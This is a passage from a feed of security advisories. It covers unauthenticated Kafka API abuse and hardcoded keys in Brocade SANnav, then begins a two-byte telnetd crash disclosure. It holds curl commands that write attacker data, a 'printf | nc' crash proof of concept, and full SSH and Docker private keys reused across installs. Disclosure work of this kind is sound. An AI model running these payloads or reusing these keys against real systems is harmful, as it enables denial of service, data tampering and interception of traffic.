  "schema": "{\"type\":\"record\",\"name\":\"FCIPTunnelMetrics\",\"namespace\":\"com.brocade.streaming\",\"fields\":[{\"name\":\"switch_wwn\",\"type\":\"string\"},{\"name\":\"port_wwn\",\"type\":\"string\"},{\"name\":\"stats_time\",\"type\":\"long\"},{\"name\":\"user_port_index\",\"type\":\"int\"},{\"name\":\"bytes_in\",\"type\":\"long\"},{\"name\":\"bytes_out\",\"type\":\"long\"},{\"name\":\"uncompressed_bytes\",\"type\":\"long\"},{\"name\":\"compressed_bytes\",\"type\":\"long\"},{\"name\":\"compression_ratio\",\"type\":\"float\"},{\"name\":\"retransmits\",\"type\":\"long\"},{\"name\":\"connected_count\",\"type\":\"long\"},{\"name\":\"dup_acks\",\"type\":\"long\"},{\"name\":\"out_of_order\",\"type\":\"long\"},{\"name\":\"slow_starts\",\"type\":\"long\"},{\"name\":\"round_trip_time_min\",\"type\":\"long\"},{\"name\":\"round_trip_time_max\",\"type\":\"long\"},{\"name\":\"round_trip_time_avg\",\"type\":\"long\"}]}"
}
kali%
</code></pre>
<p>Creating a new Kafka subject <code>pierrewashere</code>, using the payload located in the following <code>avro.txt</code> local file:</p>
<pre><code>kali% cat avro.txt 
{"schema":"{\"namespace\":\"com.testlab\",\"name\":\"pierrewashere\",\"type\":\"record\",\"fields\":[{\"name\":\"resourcepath\",\"type\":\"string\"},{\"name\":\"resource\",\"type\":\"string\"}]}" }
kali% curl -X POST -H "Content-Type: application/vnd.schemaregistry.v1+json"  -d @avro.txt http://10.13.3.7:18081/subjects/pierrewashere/versions
{"id":141}
kali% curl -s http://10.13.3.7:18081/subjects | jq .
[
  "PortMetrics",
  "StatsCollectionCompleted-value",
  "FCIPTunnelMetrics",
  "amp_iov_viol_summary",
  "fos_flow_stats",
  "FCIPCircuitMetrics",
  "Telemetry_register-value",
  "amp_dev_port_stats",
  "pierrewashere",
  "flow_stats"
]

kali% curl -s http://10.13.3.7:18081/subjects/pierrewashere/versions/latest | jq .
{
  "subject": "pierrewashere",
  "version": 1,
  "id": 141,
  "schema": "{\"type\":\"record\",\"name\":\"pierrewashere\",\"namespace\":\"com.testlab\",\"fields\":[{\"name\":\"resourcepath\",\"type\":\"string\"},{\"name\":\"resource\",\"type\":\"string\"}]}"
}
</code></pre>
<p>An attacker can send any malicious data into any subject.</p>
<p>This access also allows the attacker to fill the entire disk by sending large chunks of data into Kafka using the string type, resulting in a complete DoS of the appliance. For example, it is possible to send Gigabytes of data and fill the hard disk.</p>
<p>There is no authentication implemented in the Kafka APIs.</p>
<p>Furthermore, it was determined the jetty version used is <code>9.4.14.v20181114</code>:</p>
<pre><code>kali% curl -X POST -H "Content-Type: application/vnd.kafka.avro.v2+json" \
      -H "Content-Type: application/vnd.schemaregistry.v1+json" \
      --data '{"value_schema": "{\"type\": \"record\", \"name\": \"User\", \"fields\": [{\"name\": \"name\", \"type\": \"string\"}]}", "records": [{"value": {"name": "testUser"}}]}' \
      "http://10.13.3.7:18081/subjects/avrotest"
&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html;charset=utf-8"/&gt;
&lt;title&gt;Error 400 Bad Request&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;&lt;h2&gt;HTTP ERROR 400&lt;/h2&gt;
&lt;p&gt;Problem accessing /subjects/avrotest. Reason:
&lt;pre&gt;    Bad Request&lt;/pre&gt;&lt;/p&gt;&lt;hr&gt;&lt;a href="http://eclipse.org/jetty"&gt;Powered by Jetty:// 9.4.14.v20181114&lt;/a&gt;&lt;hr/&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>There are some CVEs in this version of Jetty:</p>
<p><img alt="" src="images/2024-sannav-jetty.png" /></p>
<p>When checking on the switches, it appears some switches are sending data to Kafka, as shown below:</p>
<pre><code>SWITCH:FID1:root&gt; netstat -an | grep 19094
tcp        0      0 10.13.3.8:56543       10.13.3.7:19094     ESTABLISHED
</code></pre>
<p>An attacker can send malicious data into the Kafka APIs.</p>
<p>An attacker can fill the entire disk by sending large chunks of data into Kafka using the String type, resulting in a complete DoS of the appliance.</p>
<p>It is impossible to trust any data submitted from the switches to Kafka.</p>
<p>The data is sent over HTTP or HTTPS. An attacker can MITM HTTP connections and insert malicious data.</p>
<p>The version of Jetty is vulnerable to several critical vulnerabilities.</p>
<p><a id="hardcoded-ssh-keys"></a></p>
<h2>Details - Hardcoded SSH Keys</h2>
<p>The  SANnav server is based on an official image provided by Broadcom, and the SSH keys inside the OVA image are hardcoded. It was found that the SSH keys are always identical in the VM every time SANnav is installed.</p>
<p>An attacker can decrypt the SSH traffic to the SANnav appliance and compromise it.</p>
<p>Any VM based on the official OVA images is vulnerable to MITM over SSH because of these hardcoded keys:</p>
<pre><code>[root@sannav-portal-v222 ssh]# pwd
/etc/ssh
[root@sannav-portal-v222 ssh]# ls -la
total 620
drwxr-xr-x.  2 root root        225 May 17  2022 .
drwxr-xr-x. 77 root root       8192 Mar  6 02:40 ..
-rw-r--r--   1 root root     581843 Nov 24  2021 moduli
-rw-r--r--   1 root root       2276 Nov 24  2021 ssh_config
-rw-------   1 root root       4469 May 17  2022 sshd_config
-rw-r-----.  1 root ssh_keys    227 Apr 26  2021 ssh_host_ecdsa_key
-rw-r--r--.  1 root root        162 Apr 26  2021 ssh_host_ecdsa_key.pub
-rw-r-----.  1 root ssh_keys    387 Apr 26  2021 ssh_host_ed25519_key
-rw-r--r--.  1 root root         82 Apr 26  2021 ssh_host_ed25519_key.pub
-rw-r-----.  1 root ssh_keys   1675 Apr 26  2021 ssh_host_rsa_key
-rw-r--r--.  1 root root        382 Apr 26  2021 ssh_host_rsa_key.pub
[root@sannav-portal-v222 ssh]# cat ssh_host_ecdsa_key
-----BEGIN EC PRIVATE KEY-----
MHcCAQEEIJgH/x3n/0uvdhwWzFbCbvDArO5gX8IwRXNU+ot5M2KkoAoGCCqGSM49
AwEHoUQDQgAExHheDEZ4Vz3BLCKL1wU8NKUckyc1tqgC+qgCLN+TtObHtdI5+i+7
rS1Zv3qA7Pm1l+F8vs96YY9UJ7TjE9FUEg==
-----END EC PRIVATE KEY-----
[root@sannav-portal-v222 ssh]# cat ssh_host_ed25519_key
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAQYE7yRUULJOIeqF3+lW2BwSGAPtw2roNUpedXyUMy/wAAAIga/868Gv/O
vAAAAAtzc2gtZWQyNTUxOQAAACAQYE7yRUULJOIeqF3+lW2BwSGAPtw2roNUpedXyUMy/w
AAAEC9POU6i1dWFEpuB4t173ausxqJ6MZrhzp+Fu/ElGV4lRBgTvJFRQsk4h6oXf6VbYHB
IYA+3Daug1Sl51fJQzL/AAAAAAECAwQF
-----END OPENSSH PRIVATE KEY-----
[root@sannav-portal-v222 ssh]# cat ssh_host_rsa_key
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAt8ey0uQd7+zUXxFGq5Bpw2XNmkNihoEDVHFA737Jfa4Og9Z7
EwRg4kiyQzL3BckEGQAW8xc4jRjV2OAiHTR9qveusIMjHs49/Lt3SUP9yxWPzp3l
DbP/MYcwO8Yy9X5mO05wKiD2ltoOyuijmfb631DFH673Wgkmxy7YQeuiKQ8s3Cls
vhrO2zQ9rAO2GTdeyQ8CeI9vadtT/2REd97nH4CQhu5Fjq7o2HDd3u3QbVOxn9Sx
Cl8r+U3PbsuriKNqZbdpJXJZDevEfZYgc/xfOPv4tOm/lafstZIPRwVW2JefOytd
/ORL0yoNA2aVr+e1VlFdlp0h5WK8JGaBlVEf3wIDAQABAoIBAAdpW1Hb90UcxPfM
h5AVs944ddE51HheLZczNg4yi8ewxE8W0EHVFF8r1VyWapXmJG8prMNC9XnjPYSQ
jW+mFUdW08m0kC8G3EMcAFSJFGwjQ3hur7UcxDboH87ZUGbMIS1VHXrld2xgAOa3
+RkVd8qXxEth0AHmipTP09LcwN5s970wMwW0/WZ+6idO7Zdvpo7nJ0zqgFdylSX+
xq/7vj+LHTq0Z0v7mMhyrncVurQkXPpAB5biA69ISTA9Aiy/qHZu1HqyBAQ/Qru4
csqT4fRRGbiTvzmK+3JeIgZ6GWEYJA2gc3hnX4xY+NqFpbbBxVfli6pSyIPYZzzX
4GWD/ykCgYEA4VFSt6FDrJFFbJvic3owZbglHQss2GC7j5WDWzUuhvDXDKKzwsnR
9EmevCw47JLIDbhhR2DYTcikCCPY4CsfHQqieEdtFkjQ4JiwSgTszvupjgAwHOWO
V6ndrMgaj4VSLD/iQ2Ax+8+4ga8JDNZT6EIq/MgPSmPMlXOt2ty4rA0CgYEA0M5b
GBy+CXIZXzs5fB7bxilA20AS8khIrl7YB+Q1iQd+60IfAKYrPZXxhcbVpiqkU+99
Ttcvo6h7PYHyE4ybVZR9wGL1/CJB1GX+fL1CEpfhYMK5dgHtH+iV1f2AJmw17/P4
5RASThpyGx5E6Mx0T98U45R94CmlWZ1WmygjxJsCgYB0hl818mOSSmrR+WhKekWv
RWWEOLRPju9RGWyebcmLJeDBex9mPIOlR7Gc9W3XAy4M0m8UwAP9bidOwmM1w3dK
yKYveBj1bmD/1ldNYHCrtsEAXB6Fwz4zHfkzkyURVkyh78PvPj97T/jGsKQIjItG
UXnz0u79dNFn9TRTPNUQvQKBgQCmvYKE2L7wcArOv06CTWoW7e56psn6a7qOc/Jz
KsuNZ0z0tNJpBEjXXxuFRmhpzvd2h3I7OR8zw2DWlyQmdEu+pVtd/CiOdRS4ddIo
7kEK8/nn+Nd84sDmkCbGwS5KgHL58Is68ACOGhQwj5VbiZkABxZ5PaTfEqKV00zL
jdwyLQKBgBeUeKdEd3oT0KKnhVxCkfkIlRDfd1elGMEuD5WdXDv29oUsNMO60QF4
4wEs0nFAVug/oXyb5e2supxRIK0nl0sepG11Rl+KfXEajVkb4htfpq60KJuShZww 
Pvih9bO2HZoeWvBs2Itfyla59R81GIar/DF+kipcK8Q3CTU8qeib
-----END RSA PRIVATE KEY-----
[root@sannav-portal-v222 ssh]#
</code></pre>
<p><a id="suspicious-network-traffic-www.gridgain.com"></a></p>
<h2>Details - Suspicious network traffic (www.gridgain.com)</h2>
<p>The SANnav appliance regularly sends HTTPS requests to <code>www.gridgain.com</code> at a small interval.
The appliance will do DNS resolutions for <code>www.gridgain.com</code> and then will send HTTPS requests as shown below:</p>
<pre><code>08:56:52.369555 IP 10.13.3.7.39267 &gt; 1.1.1.1.53: 45069+ A? www.gridgain.com. (34)
08:56:52.436017 IP 1.1.1.1.53 &gt; 10.13.3.7.39267: 45069 3/0/0 A 104.20.72.180, A 172.67.0.7, A 104.20.71.180 (82)
08:56:52.436749 IP 10.13.3.7.53900 &gt; 104.20.72.180.443: Flags [S], seq 2047387243, win 29200, options [mss 1460,sackOK,TS val 269727762 ecr 0,nop,wscale 7], length 0
08:56:52.437847 IP 104.20.72.180.443 &gt; 10.13.3.7.53900: Flags [S.], seq 977183308, ack 2047387244, win 65160, options [mss 1400,sackOK,TS val 4049146153 ecr 269727762,nop,wscale 13], length 0
08:56:52.437892 IP 10.13.3.7.53900 &gt; 104.20.72.180.443: Flags [.], ack 1, win 229, options [nop,nop,TS val 269727763 ecr 4049146153], length 0
08:56:52.442099 IP 10.13.3.7.53900 &gt; 104.20.72.180.443: Flags [P.], seq 1:409, ack 1, win 229, options [nop,nop,TS val 269727767 ecr 4049146153], length 408
08:56:52.443574 IP 104.20.72.180.443 &gt; 10.13.3.7.53900: Flags [.], ack 409, win 7, options [nop,nop,TS val 4049146159 ecr 269727767], length 0
08:56:52.448562 IP 104.20.72.180.443 &gt; 10.13.3.7.53900: Flags [R.], seq 1, ack 409, win 8, length 0
08:58:42.419664 IP 10.13.3.7.59200 &gt; 1.1.1.1.53: 54140+ A? www.gridgain.com. (34)
08:58:42.421037 IP 1.1.1.1.53 &gt; 10.13.3.7.59200: 54140 3/0/0 A 172.67.0.7, A 104.20.71.180, A 104.20.72.180 (82)
08:58:42.421403 IP 10.13.3.7.36258 &gt; 172.67.0.7.443: Flags [S], seq 1584590370, win 29200, options [mss 1460,sackOK,TS val 269837747 ecr 0,nop,wscale 7], length 0
08:58:42.422603 IP 172.67.0.7.443 &gt; 10.13.3.7.36258: Flags [S.], seq 3995360301, ack 1584590371, win 65160, options [mss 1400,sackOK,TS val 137617048 ecr 269837747,nop,wscale 13], length 0
08:58:42.422651 IP 10.13.3.7.36258 &gt; 172.67.0.7.443: Flags [.], ack 1, win 229, options [nop,nop,TS val 269837748 ecr 137617048], length 0
08:58:42.425856 IP 10.13.3.7.36258 &gt; 172.67.0.7.443: Flags [P.], seq 1:417, ack 1, win 229, options [nop,nop,TS val 269837751 ecr 137617048], length 416
</code></pre>
<p>Such behavior was not understood.</p>
<p><a id="hardcoded-docker-keys"></a></p>
<h2>Details - Hardcoded Docker Keys</h2>
<p>The SANnav OVA image contains hardcoded keys used by Docker to reach remote registries over TLS. These keys are located in <code>/etc/docker/key.json</code>.</p>
<p>Using TLS connections with an exposed key allows an attacker to MITM the traffic.</p>
<p>Any VM based on the official OVA images is vulnerable to MITM because of the hardcoded keys present in <code>/etc/docker.key.json</code>:</p>
<pre><code>[root@sannav-portal-v222 docker]# ls -la /etc/docker/
total 20
drwxr-xr-x.  2 root root   41 Apr 19 02:13 .
drwxr-xr-x. 79 root root 8192 Apr 28 06:36 ..
-rw-r--r--   1 root root  456 Apr 19 02:13 daemon.json
-rw-------.  1 root root  244 Apr 27  2021 key.json
[root@sannav-portal-v222 docker]# cat /etc/docker/key.json ;echo
{"crv":"P-256","d":"1BHHb6gaO7ds8kUM6xifPvFttfyvfRQQQcpJB0-iW6M","kid":"JNOI:BTG4:EE6S:YXWW:6GXN:6G2Y:3RNZ:5R6C:WEJU:6Z35:Z4GN:T4UE","kty":"EC","x":"Ox05VYYpZTIsmHfCzM7pp1MgsC6Bc1BGP3zR-mM6MlI","y":"zoQBZ9sZqIeOy5FzBYY4cb98f6GYfE45ILfMFz-RpF4"}
[root@sannav-portal-v222 docker]#
</code></pre>
<p>An attacker can decrypt the traffic from the Docker daemon to the remote Docker registries.</p>
<h2>Researcher comments on Vendor Response</h2>
<p>19 months to provides security patches are quite long.</p>
<p>Rejecting <strong>valid</strong> security assessments is also quite concerning.</p>
<p>A second security assessment on Brocade switches was rejected in September 2022 by Brocade. One of the rejected vulnerabilities was found internaly by Brocade teams and then promoted to a valid CVE in November 2022: <a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/21217">CVE-2022-33186</a>, CVSS: 9.4 - CRITICAL - credited to Brocade.</p>
<h2>Vendor Response</h2>
<p>The vendor provided several security bulletins:</p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23245">CVE-2024-2859 - Root access permitted by default and several insecure options set</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23244">CVE-2024-29960 - Hard Coded and identical SSH keys inside the OVA image</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23246">CVE-2024-29961 - Ping at regular intervals</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23248">CVE-2024-29962 - Insecure file permission setting that makes files world-readable</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23247">CVE-2024-29963 - Hardcoded keys used by Docker to reach remote registries over TLS</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23249">CVE-2024-29964 - Docker instances in Brocade SANnav before v2.3.1 and v2.3.0a have an insecure architecture and configuration</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23250">CVE-2024-29965 - A local attacker can recover backup files, restore them to a new malicious appliance, and retrieve the passwords of all the switches</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23255">CVE-2024-29966 - hard-coded credential in the documentation that appear as the root password</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23254">CVE-2024-29967 - Docker instances inside the appliance have insecure mount points, allowing reading and writing access to sensitive files</a></p>
<p><a id="timeline"></a></p>
<h2>Report Timeline</h2>
<ul>
<li>Aug 2022: Security assessment performed on SANnav 2.1.1</li>
<li>Sep 2022: A complete report was sent to Dell (as a support provider for this software) and forwarded to Brocade</li>
<li>Sep 2022: The report was rejected by Brocade</li>
<li>Oct 2022 - Dec 2022: Negotiations with Brocade to get security patches</li>
<li>Dec 7, 2022: <strong>Failed negotiations</strong>: Brocade support team confirmed that (i) no security patches would be provided since the tests were not carried out on the latest version and were invalid, (ii) all the reported vulnerabilities were misconfiguration issues in the devices and sannav, (iii) anyway, since the tested versions were EOL, CVEs would never be published if a vulnerability is found and (iv) asked Dell to provide a list of relevant vulnerabilities for the supported versions<br>
Pierre's comments: An additional report was also provided to Brocade in September 2022 with some 0-day vulnerabilities in Brocade Fibre Channel switches. At that time, even though the version of SANnav was outdated, <u>some of the reported vulnerabilities were also found in 3 supported versions of FOS (Fabric Operating System).</u> All the reported vulnerabilities were rejected.</li>
<li>Jan 31, 2023: The report is sent again to the Dell's Broadcom support team. </li>
<li>Feb 1, 2023: Dell replied that no actions would be taken until the vulnerabilities have been replicated by the customer in the latest versions of SANnav and FOS and that the latest FOS and SANnav are patched.</li>
<li>Apr 28, 2023: Thanks to some people willing to get security patches, I was able to get access the latest version of SANnav (2.2.2)</li>
<li>May 2, 2023: Reassessment of SANnav</li>
<li>May 3, 2023: An updated report is sent to Brocade PSIRT confirming that all the vulnerabilities are still present, with 3 new additional 0-day vulnerabilities, since Brocade will likely only accept security assessments on the latest versions and will reject vulnerabilities even in a supported version (if this is not the latest version)</li>
<li>May 3, 2023: Brocade PSIRT confirmed the reception of the security assessment</li>
<li>Jun 7, 2023: Brocade PSIRT confirmed some of the vulnerabilities in the latest version and confirms that SANnav 2.3.1 will contains security patches</li>
<li>Jul - Aug, 2023: Discussions with Brocade PSIRT about the vulnerabilities (related to issues in SANnav or misconfiguration issues).</li>
<li>December 2023: SANnav 2.3.1 is released</li>
<li>Mar 24, 2024: Brocade PSIRT provided a list of 9 CVEs and embargoed them until April 18th</li>
<li>Apr 17, 2024: CVEs and security bulletins are published</li>
<li>Apr 18, 2024: Brocade PSIRT is contacted to get the complete list of CVEs with the corresponding reported vulnerabilities</li>
<li>Apr 18, 2024: Brocade PSIRT provided a list of CVEs for SANnav vulnerabilities and requested a delay in disclosing vulnerabilities in Brocade Fibre Channel switches</li>
<li>Apr 24, 2024: A security advisory is published</li>
</ul>
<h2>Credits</h2>
<p>These vulnerabilities were found by Pierre Barre aka Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/blog/2024-04-24-brocade-sannav-18-vulnerabilities.html">https://pierrekim.github.io/blog/2024-04-24-brocade-sannav-18-vulnerabilities.html</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23245">CVE-2024-2859 - Root access permitted by default and several insecure options set</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23286">CVE-2024-4173 - Brocade SANnav ova versions exposes Kafka in the wan interface</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23284">CVE-2024-4161 - Syslog traffic sent in clear-text</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23282">CVE-2024-4159 - Protection mechanisms</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23244">CVE-2024-29960 - Hard Coded and identical SSH keys inside the OVA image</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23246">CVE-2024-29961 - Ping at regular intervals</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23248">CVE-2024-29962 - Insecure file permission setting that makes files world-readable</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23247">CVE-2024-29963 - Hardcoded keys used by Docker to reach remote registries over TLS</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23249">CVE-2024-29964 - Docker instances in Brocade SANnav before v2.3.1 and v2.3.0a have an insecure architecture and configuration</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23250">CVE-2024-29965 - A local attacker can recover backup files, restore them to a new malicious appliance, and retrieve the passwords of all the switches</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23255">CVE-2024-29966 - hard-coded credential in the documentation that appear as the root password</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23254">CVE-2024-29967 - Docker instances inside the appliance have insecure mount points, allowing reading and writing access to sensitive files</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23285">no CVE - Insecure sannav access using undocumented Brocade SANnav user sannav</a></p>
<p><a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23283">no CVE - HTTPS configuration between Brocade SANnav Management Portal and Brocade SAN switches</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>2-byte DoS in freebsd-telnetd / netbsd-telnetd / netkit-telnetd / inetutils-telnetd / telnetd in Kerberos Version 5 Applications - Binary Golf Grand Prix 3 - CVE-2022-39028</title>
        <link href="2022-08-24-2-byte-dos-freebsd-netbsd-telnetd-netkit-telnetd-inetutils-telnetd-kerberos-telnetd.html"/>
        <content type="html"><h2>Product Description</h2>
<p>FreeBSD-telnetd, NetBSD-telnetd, netkit-telnetd, telnetd in Kerberos Version 5 Applications and inetutils-telnetd are standard telnet servers used in several Linux distributions, BSD systems, UNIX systems and commercial products:</p>
<ul>
<li>FreeBSD, NetBSD</li>
<li>Debian, Fedora, Gentoo, ArchLinux, ... - using inetutils-telnetd or netkit-telnetd</li>
<li>specific Palo Alto appliances</li>
<li>specific Cisco appliances</li>
<li>specific Brocade appliances</li>
<li>specific Arista appliances</li>
<li>OS running telnetd from Kerberos Version 5 Applications: this may include BSD 4.3 Reno, UNICOS 5.1 to UNICOS 7.0, SunOs 3.5 to SunOs 4.1, DYNIX V3.0.17.9 and Ultrix 3.1 to Ultrix 4.0. Note that these OS may be EOL.</li>
<li>...</li>
</ul>
<p>From our understanding, the first implementation containing the vulnerabilities dates from February 1991. This is the Kerberos telnetd implementation available at <a href="https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/telnetd">https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/telnetd</a>.</p>
<p>This code has been merged into FreeBSD in the 90s. Then netkit-telnetd comes from a very old version of the FreeBSD telnetd. And finally inetutils-telnetd is a fork of netkit-telnetd.</p>
<p>These vulnerabilities are very old (at least 30 years).</p>
<p>In all these implementations, the vulnerable part of the code base has not been updated for 30 years and appears not to be maintained anymore.</p>
<p>A part of the list of affected products was obtained by using <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10188">CVE-2020-10188 (a vulnerability in netkit-telnetd)</a>.
We can find advisories from <a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-telnetd-EFJrEzPx">Cisco</a>, <a href="https://security.paloaltonetworks.com/CVE-2020-10188">Palo Alto</a>, <a href="https://www.broadcom.com/support/fibre-channel-networking/security-advisories/brocade-security-advisory-2021-1013">Brocade</a> and <a href="https://www.arista.com/en/support/advisories-notices/security-advisories/10702-security-advisory-48">Arista</a> referencing CVE-2020-10188 in their products.</p>
<p>Furthermore, from <a href="https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/README">https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/README</a>, the release date is February 22, 1991 and the supported OS are BSD 4.3 Reno, UNICOS 5.1 to UNICOS 7.0, SunOs 3.5 to SunOs 4.1, DYNIX V3.0.17.9 and Ultrix 3.1 to Ultrix 4.0.
We can assume these OS running kerberos-telnetd are also vulnerable.</p>
<p>We wanted to participate to the <a href="https://tmpout.sh/bggp/3/">Binary Golf Grand Prix 3</a> with a fun vulnerability very easy to trigger over the network without authentication and with only 2 bytes.</p>
<p>The summary is:</p>
<ol>
<li><a href="#remote-dos">Details - Remote DoS in FreeBSD telnetd</a><br>
1.1. <a href="#remote-dos-bonus-points">Bonus points</a><br>
1.2. <a href="#remote-dos-netkit-telnet-0.17">netkit-telnet-0.17</a><br>
1.3. <a href="#remote-dos-inetutils">Inetutils</a><br>
1.4. <a href="#remote-dos-netbsd-telnetd">NetBSD-telnetd</a><br>
1.5. <a href="#remote-dos-kerberos-telnetd-latest-version">Telnetd in Kerberos Version 5 Applications - latest version</a><br>
1.6. <a href="#remote-dos-kerberos-telnetd-initial-version">Telnetd in Kerberos Version 5 Applications - initial version</a><br>
1.7. <a href="#remote-dos-analysis">Analysis of the "normal" execution path</a><br>
1.8. <a href="#remote-dos-root-cause-analysis">Root cause analysis of the crashes</a><br>
1.9. <a href="#remote-dos-macos">MacOS</a><br>
1.10. <a href="#remote-dos-conclusion">Conclusion</a><br></li>
<li><a href="#permanent-remote-dos">Details - permanent Remote DoS</a></li>
<li><a href="#full-disclosure">Vendor Response</a></li>
<li><a href="#recommendations">Recommendations</a></li>
<li><a href="#bggp3-score">BGGP #3 Score</a></li>
<li><a href="#credits">Credits</a></li>
<li><a href="#references">References</a></li>
<li><a href="#disclaimer">Disclaimer</a></li>
</ol>
<p><a id="remote-dos"></a></p>
<h2>Details - Remote DoS in FreeBSD telnetd</h2>
<p>It is possible to remotely crash the "standard" FreeBSD telnetd server by sending 2 bytes (<code>\xff\xf7</code>) from the network, as shown below:</p>
<pre><code>kali% printf "\xff\xf7" | nc -n -v 192.168.1.200 23
(UNKNOWN) [192.168.1.200] 23 (telnet) open
&lt;FF&gt;&lt;FD&gt;%
kali%
</code></pre>
<p>And we can confirm the remote telnetd server running on a FreeBSD 13.1 machine crashed:</p>
<pre><code>freebsd-13-1p1# echo "telnet stream  tcp     nowait  root    /usr/libexec/telnetd    telnetd" &gt;&gt; /etc/inetd.conf
freebsd-13-1p1# /etc/rc.d/inetd onestart
Starting inetd.
freebsd-13-1p1# echo "waiting for the PoC..."
waiting for the PoC...
[...]
freebsd-13-1p1# dmesg | tail -n 1
pid 785 (telnetd), jid 0, uid 0: exited on signal 11 (core dumped)
</code></pre>
<p>A working variant exists with <code>\xff\xf8</code>. The vulnerable code is located 2 lines under the first vulnerability in the source code.</p>
<pre><code>kali% printf "\xff\xf7" | nc -n -v 192.168.1.200 23
(UNKNOWN) [192.168.1.200] 23 (telnet) open
&lt;FF&gt;&lt;FD&gt;%
kali%
</code></pre>
<p>Debugging with FreeBSD:</p>
<pre><code>freebsd-13-1p1# freebsd-update fetch
Looking up update.FreeBSD.org mirrors... 2 mirrors found.
Fetching metadata signature for 13.1-RELEASE from update2.freebsd.org... done.
Fetching metadata index... done.
Inspecting system... done.
Preparing to download files... done.
Fetching 7 patches.... done.
Applying patches... done.
freebsd-13-1p1# freebsd-update install
Creating snapshot of existing boot environment... done.
Installing updates...Scanning //usr/share/certs/blacklisted for certificates...
Scanning //usr/share/certs/trusted for certificates...
 done.
freebsd-13-1p1#
freebsd-13-1p1# cd /tmp
freebsd-13-1p1# fetch https://download.freebsd.org/ftp/releases/amd64/13.1-RELEASE/src.txz
src.txz                                                183 MB 6208 kBps    31s
freebsd-13-1p1# tar -C / -xvf src.txz
...
x usr/src/secure/caroot/blacklisted/GeoTrust_Primary_Certification_Authority_-_G3.pem
x usr/src/secure/caroot/blacklisted/Camerfirma_Chambers_of_Commerce_Root.pem
x usr/src/secure/caroot/blacklisted/Trustis_FPS_Root_CA.pem
freebsd-13-1p1# cat &lt;&lt;EOF &gt; /etc/make.conf
CFLAGS=-pipe
WITH_CTF=1
DEBUG_FLAGS=-g
EOF
freebsd-13-1p1# cd /usr/src/lib/libtelnet &amp;&amp; make obj &amp;&amp; make depend &amp;&amp; make &amp;&amp; make install
cc  -pipe -fno-common   -I/usr/src/contrib/telnet -DENCRYPTION -DAUTHENTICATION -DSRA -DKRB5 -DFORWARD -Dnet_write=telnet_net_write -g -MD  -MF.depend.genget.o -MTgenget.o -std=gnu99 -Wno-format-zero-length -fstack-protector-strong -Wsystem-headers -Werror -Wall -Wno-format-y2k -Wno-uninitialized -Wno-pointer-sign -Wno-empty-body -Wno-string-plus-int -Wno-unused-const-variable -Wno-error=unused-but-set-variable -Wno-tautological-compare -Wno-unused-value -Wno-parentheses-equality -Wno-unused-function -Wno-enum-conversion -Wno-unused-local-typedef -Wno-address-of-packed-member -Wno-switch -Wno-switch-enum -Wno-knr-promoted-parameter  -Qunused-arguments    -c /usr/src/contrib/telnet/libtelnet/genget.c -o genget.o
...
